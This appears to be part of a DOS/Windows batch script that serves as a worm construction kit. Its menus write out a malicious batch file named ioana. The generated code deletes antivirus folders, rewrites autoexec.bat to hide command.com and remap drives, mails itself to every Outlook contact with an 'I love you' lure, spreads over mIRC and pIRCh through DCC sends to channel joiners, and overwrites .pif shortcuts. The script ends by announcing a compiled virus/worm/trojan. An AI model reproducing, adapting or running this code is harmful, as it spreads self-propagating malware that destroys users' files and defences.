@echo.@if exist c:\vs95\*.* deltree/y c:\vs95\>>ioana.txt
@echo.@if exist c:\antivi~1\*.* deltree/y c:\antivi~1\>>ioana.txt
@echo.@if exist c:\toolkit\findvi~1\*.* deltree/y c:\toolkit\findvi~1\>>ioana.txt
@echo.@if exist c:\pccill~1\*.* deltree/y c:\pccill~1\>>ioana.txt
ctty con
goto mnj

:gg
@echo.:: no retro>>ioana.txt
goto mnj

:mnj
cls
echo.
echo.
echo.
echo    1 - Payloadz
echo.
echo    2 - No payloadz
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto ii
if errorlevel 1 goto hh
echo CHOICE missing
goto done

:hh
ctty nul
@echo"@echo.@time 00:00:00,00>c:\autoexec.bat">>ioana.txt
@echo"@echo.@date 80-01-01>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         É» É»   É» É»>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ºº ºÈ» É¼º ºº>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ºº È»ÈÍ¼É¼ ºº   This means that you`ve been burned by>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ºº  º   º  ºº                    DvL>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         ºº  È» É¼  ºº>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo         È¼   ÈÍ¼   È¼>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@echo.>>c:\autoexec.bat">>ioana.txt
@echo"@echo.@attrib c:\command.com +h +s +r>>c:\autoexec.bat">>ioana.txt
@echo"@echo.echo 123>clock$>>c:\autoexec.bat">>ioana.txt
@echo"@echo.subst e: a:\>>c:\autoexec.bat">>ioana.txt
@echo"@echo.subst d: a:\>>c:\autoexec.bat">>ioana.txt
@echo"@echo.subst c: a:\>>c:\autoexec.bat">>ioana.txt
@echo"@echo.cls>>c:\autoexec.bat">>ioana.txt
ctty con
goto mop

:ii
@echo.:: no payloads>>ioana.txt
goto mop

:mop
cls
echo.
echo.
echo.
echo    1 - Outlook Express spreading
echo.
echo    2 - No OE spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto kk
if errorlevel 1 goto jj
echo CHOICE missing
goto done

:jj
ctty nul
@echo"@echo.on error resume next>ioana.vbs">>ioana.txt
@echo"@echo.dim a,b,c,d,e>>ioana.vbs">>ioana.txt
@echo"@echo.set a = Wscript.CreateObject("Wscript.Shell")>>ioana.vbs">>ioana.txt
@echo"@echo.set b = CreateObject("Outlook.Application")>>ioana.vbs">>ioana.txt
@echo"@echo.set c = b.GetNameSpace("MAPI")>>ioana.vbs">>ioana.txt
@echo"@echo.for y = 1 To c.AddressLists.Count>>ioana.vbs">>ioana.txt
@echo"@echo.set d = c.AddressLists(y)>>ioana.vbs">>ioana.txt
@echo"@echo.x = 1>>ioana.vbs">>ioana.txt
@echo"@echo.set e = b.CreateItem(0)>>ioana.vbs">>ioana.txt
@echo"@echo.for o = 1 To d.AddressEntries.Count>>ioana.vbs">>ioana.txt
@echo"@echo.f = d.AddressEntries(x)>>ioana.vbs">>ioana.txt
@echo"@echo.e.Recipients.Add f>>ioana.vbs">>ioana.txt
@echo"@echo.x = x + 1>>ioana.vbs">>ioana.txt
@echo"@echo.next>>ioana.vbs">>ioana.txt
@echo"@echo.e.Subject = " For my special aNGeL ... IOANA ... ">>ioana.vbs">>ioana.txt
@echo"@echo.e.Body = " I love you ">>ioana.vbs">>ioana.txt
@echo"@echo.e.Attachments.Add ("c:\windows\system\ioana\ioana.bat")>>ioana.vbs">>ioana.txt
@echo"@echo.e.DeleteAfterSubmit = False>>ioana.vbs">>ioana.txt
@echo"@echo.e.Send>>ioana.vbs">>ioana.txt
@echo"@echo.f = "">>ioana.vbs">>ioana.txt
@echo"@echo.next>>ioana.vbs">>ioana.txt
@echo.@start ioana.vbs>>ioana.txt
ctty con
goto kol

:kk
@echo.:: no Outlook Express spreading>>ioana.txt
goto kol

:kol
cls
echo.
echo.
echo.
echo    1 - mIRC spreading
echo.
echo    2 - No mIRC spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto mm
if errorlevel 1 goto ll
echo CHOICE missing
goto done

:ll
ctty nul
@echo"@echo.[script]>script.ini">>ioana.txt
@echo"@echo.n0=on 1:JOIN:#:{>>script.ini">>ioana.txt
@echo"@echo.n1=/if ( $nick == $me ) { halt }>>script.ini">>ioana.txt
@echo"@echo.n2=/dcc send $nick c:\windows\system\ioana\ioana.bat>>script.ini">>ioana.txt
@echo"@echo.n3=}>>script.ini">>ioana.txt
@echo.@if exist c:\mirc\script.ini deltree/y c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\script.ini deltree/y c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\script.ini deltree/y c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\script.ini deltree/y c:\progra~1\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\mirc\mirc.ini copy script.ini c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\mirc.ini copy script.ini c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\mirc.ini copy script.ini c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\mirc.ini copy script.ini c:\progra~1\mirc32\script.ini>>ioana.txt
ctty con
goto toy

:mm
@echo.:: no mIRC spreading>>ioana.txt
goto toy

:toy
cls
echo.
echo.
echo.
echo    1 - pIRCh spreading
echo.
echo    2 - No pIRCh spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto oo
if errorlevel 1 goto nn
echo CHOICE missing
goto done

:nn
ctty nul
@echo"@echo.[Levels]>events.ini">>ioana.txt
@echo"@echo.Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Count=6>>events.ini">>ioana.txt
@echo"@echo.Level1=000-Unknowns>>events.ini">>ioana.txt
@echo"@echo.000-UnknownsEnabled=1>>events.ini">>ioana.txt
@echo"@echo.Level2=100-Level 100>>events.ini">>ioana.txt
@echo"@echo.100-Level 100Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level3=200-Level 200>>events.ini">>ioana.txt
@echo"@echo.200-Level 200Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level4=300-Level 300>>events.ini">>ioana.txt
@echo"@echo.300-Level 300Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level5=400-Level 400>>events.ini">>ioana.txt
@echo"@echo.400-Level 400Enabled=1>>events.ini">>ioana.txt
@echo"@echo.Level6=500-Level 500>>events.ini">>ioana.txt
@echo"@echo.500-Level 500Enabled=1>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[000-Unknowns]>>events.ini">>ioana.txt
@echo"@echo.User1=*!*@*>>events.ini">>ioana.txt
@echo"@echo.UserCount=1>>events.ini">>ioana.txt
@echo"@echo.Event1=ON JOIN:#:/dcc send $nick c:\windows\system\ioana\ioana.bat>>events.ini">>ioana.txt
@echo"@echo.EventCount=1>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[100-Level 100]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[200-Level 200]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[300-Level 300]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[400-Level 400]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@echo.>>events.ini">>ioana.txt
@echo"@echo.[500-Level 500]>>events.ini">>ioana.txt
@echo"@echo.UserCount=0>>events.ini">>ioana.txt
@echo"@echo.EventCount=0>>events.ini">>ioana.txt
@echo"@deltree/y c:\pirch\events.ini >nul">>ioana.txt
@echo.@copy events.ini c:\pirch\events.ini>>ioana.txt
@echo"@deltree/y c:\pirch98\events.ini >nul">>ioana.txt
@echo.@copy events.ini c:\pirch98\events.ini>>ioana.txt
ctty con
goto pol

:oo
@echo.:: no pIRCh spreading>>ioana.txt
goto pol

:pol
cls
echo.
echo.
echo.
echo    1 - pif infection
echo.
echo    2 - No pif infection
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto qq
if errorlevel 1 goto pp
echo CHOICE missing
goto done

:pp
ctty nul
@echo"@echo.on error resume next>pif.vbs">>ioana.txt
@echo"@echo.dim wshs, msc>>pif.vbs">>ioana.txt
@echo"@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>pif.vbs">>ioana.txt
@echo"@echo.set msc=wshs.CreateShortcut("C:\pif.lnk")>>pif.vbs">>ioana.txt
@echo"@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\ioana\ioana.bat")>>pif.vbs">>ioana.txt
@echo"@echo.msc.WindowStyle = 4>>pif.vbs">>ioana.txt
@echo"@echo.msc.Save>>pif.vbs">>ioana.txt
@echo.@start pif.vbs>>ioana.txt
@echo"@type nul | choice /n /cy /ty,8 >nul">>ioana.txt
@echo.@for %%a in (%windir%\desktop\*.pif) do copy c:\pif.pif %%a>>ioana.txt
@echo.@for %%b in (%windir%\*.pif) do copy c:\pif.pif %%b>>ioana.txt
@echo.@for %%c in (%windir%\command\*.pif) do copy c:\pif.pif %%c>>ioana.txt
@echo.cls>>ioana.txt
ctty con
goto las

:qq
@echo.:: no pif infection>>ioana.txt
@echo.cls>>ioana.txt
goto las

:las
cls
@echo.
@echo.
@echo.
@echo        Your virus/worm/trojan is now compiled in curent folder [ioana.txt]
@echo                      Rename ioana.txt to filename.bat
@echo.
@echo                         Press any key to exit ...
@pause >nul
goto done

:done
cls